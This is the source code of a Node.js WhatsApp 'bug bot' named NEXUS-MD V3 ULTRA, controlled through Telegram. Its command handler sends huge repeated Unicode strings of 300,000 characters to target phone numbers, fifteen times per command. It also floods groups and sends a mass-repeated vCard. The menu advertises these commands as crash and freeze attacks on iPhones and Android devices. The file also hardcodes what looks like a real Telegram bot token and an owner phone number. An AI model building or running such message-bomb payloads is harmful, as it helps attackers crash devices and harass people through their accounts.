const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    fetchLatestBaileysVersion, 
    DisconnectReason, 
    delay,
    Browsers,
    makeCacheableSignalKeyStore
} = require("@whiskeysockets/baileys");
const TelegramBot = require('node-telegram-bot-api');
const pino = require('pino');
const express = require('express');

// --- ⚙️ CONFIGURATION ---
const TG_TOKEN = '8745872876:AAEyEHrpuYeyP94PRcYlTXSkVjv-vMjKhf8';
const tgBot = new TelegramBot(TG_TOKEN, { polling: true });
const app = express();
const PORT = process.env.PORT || 3000;
const CHANNEL_URL = "https://whatsapp.com/channel/0029Vb7a9bO6RGJKJbh4xR0F";

let botConfig = {
    botName: "NEXUS-MD V3 ULTRA",
    owner: "94767475809", 
    prefix: ".",
    isPublic: false 
};

app.get('/', (req, res) => res.send('Nexus Ultra System Online! ☠️'));
app.listen(PORT, () => console.log(`Dashboard Active on ${PORT}`));

async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('nexus_session');
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        logger: pino({ level: 'silent' }),
        browser: Browsers.macOS("Desktop"), 
        printQRInTerminal: false,
        syncFullHistory: false,
        markOnlineOnConnect: true
    });

    // --- 🤖 TELEGRAM HANDLER (ENGLISH) ---
    tgBot.on('message', async (msg) => {
        const text = msg.text;
        if (text === '/start') {
            return tgBot.sendMessage(msg.chat.id, "☠️ *NEXUS-MD V3 ULTRA BUG*\n\nSend your WhatsApp number with country code.\n*(Example: 94767475809)*", { parse_mode: 'Markdown' });
        }
        if (text && /^\d+$/.test(text) && text.length > 9) {
            try {
                tgBot.sendMessage(msg.chat.id, "⏳ *Requesting Pairing Code... Check WhatsApp.*");
                let code = await sock.requestPairingCode(text.replace(/[^0-9]/g, ''));
                tgBot.sendMessage(msg.chat.id, `🔥 *CODE:* \`${code}\` \n\nLink this code to access **1M+ Power Bugs**.`, { parse_mode: 'Markdown' });
            } catch (e) { tgBot.sendMessage(msg.chat.id, "❌ *Error!* Please restart the bot."); }
        }
    });

    // --- 📩 CONNECTION (AUTO CHANNEL FOLLOW AD) ---
    sock.ev.on('connection.update', async (up) => {
        const { connection } = up;
        if (connection === 'close') startNexus();
        else if (connection === 'open') {
            console.log('✅ ULTRA BUG BOT READY!');
            
            // Auto Follow Reminder to Owner
            const ownerJid = botConfig.owner + "@s.whatsapp.net";
            await sock.sendMessage(ownerJid, { 
                text: `🚀 *SYSTEM LINKED SUCCESSFULLY!*\n\n⚠️ *IMPORTANT:* To keep the bot active, you MUST follow our official channel:\n\n🔗 ${CHANNEL_URL}\n\n_All 1M+ Character Bugs are now Unlocked!_`,
                contextInfo: { 
                    externalAdReply: { 
                        title: "NEXUS-MD ULTRA CHANNEL",
                        body: "Follow now for 1M+ Character Bugs",
                        mediaType: 1,
                        thumbnailUrl: "https://telegra.ph/file/a8a183d25667e41793741.jpg", 
                        sourceUrl: CHANNEL_URL
                    }
                }
            });
        }
    });

    // --- 📩 BUG HANDLER (1,000,000+ POWER) ---
    sock.ev.on('messages.upsert', async (chatUpdate) => {
        try {
            const mek = chatUpdate.messages[0];
            if (!mek.message) return;
            const from = mek.key.remoteJid;
            const isOwner = mek.key.participant?.includes(botConfig.owner) || mek.key.remoteJid.includes(botConfig.owner) || mek.key.fromMe;
            
            if (!isOwner) return; 

            const body = (mek.message.conversation || mek.message.extendedTextMessage?.text || "").trim();
            if (!body.startsWith(botConfig.prefix)) return;

            const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
            const text = body.trim().split(/ +/).slice(1).join(" ");
            const target = text + "@s.whatsapp.net";

            // 🔥 ULTRA BUG PAYLOADS (1,000,000+ Characters)
            const ultraBug = "☠️" + "ꦿ".repeat(100000) + "᥋".repeat(100000) + "꠵".repeat(100000);

            switch (command) {
                case 'menu':
                case 'bug':
                    const menu = `╭───〔 *NEXUS ULTRA V3* 〕───┈
│
│ 🦠 *1M+ CHARACTER BUG SYSTEM*
│
├ ☠️ *1. .ios1* - iPhone Hard Lag
├ 🔥 *2. .ios2* - iPhone UI Freeze
├ 💀 *3. .kill* - Android Destroyer
├ ❄️ *4. .freeze* - System Lag
├ 📍 *5. .loc* - Location 1M Bug
├ 📇 *6. .vcard* - Vcard Crash
├ 🌀 *7. .group* - Group Destroyer
├ 🧨 *8. .bomb* - Spam 1M Power
├ 🌌 *9. .the_end* - Total Wipe (1M+)
│
╰─────────────┈
 ⚡ *STATUS:* ULTRA PRIVATE
 👑 *DEV:* SASIYA MD`;

                    await sock.sendMessage(from, { 
                        text: menu,
                        contextInfo: { 
                            externalAdReply: { 
                                title: "NEXUS-MD ULTRA BUG MENU",
                                body: "1M+ POWER ACTIVE",
                                mediaType: 1,
                                thumbnailUrl: "https://telegra.ph/file/a8a183d25667e41793741.jpg", 
                                sourceUrl: CHANNEL_URL
                            }
                        }
                    }, { quoted: mek });
                    break;

                case 'ios1':
                case 'the_end':
                    if (!text) return;
                    await sock.sendMessage(from, { text: "🌑 *DEPLOYING 1,000,000+ CHARACTER BUG...*" });
                    for(let i=0; i<15; i++) {
                        await sock.sendMessage(target, { text: ultraBug });
                        await delay(300);
                    }
                    await sock.sendMessage(from, { text: "💀 *TARGET WIPED OUT!*" });
                    break;

                case 'group':
                    if (!text) return;
                    for(let i=0; i<10; i++) {
                        await sock.sendMessage(text, { text: ultraBug });
                    }
                    break;
                
                case 'vcard':
                    const vcard = 'BEGIN:VCARD\nVERSION:3.0\nFN:Nexus Virus\nEND:VCARD'.repeat(500);
                    await sock.sendMessage(target, { contacts: { displayName: 'Nexus-MD', contacts: [{ vcard }] } });
                    break;
            }
        } catch (e) { console.log(e); }
    });

    sock.ev.on('creds.update', saveCreds);
}

startNexus();
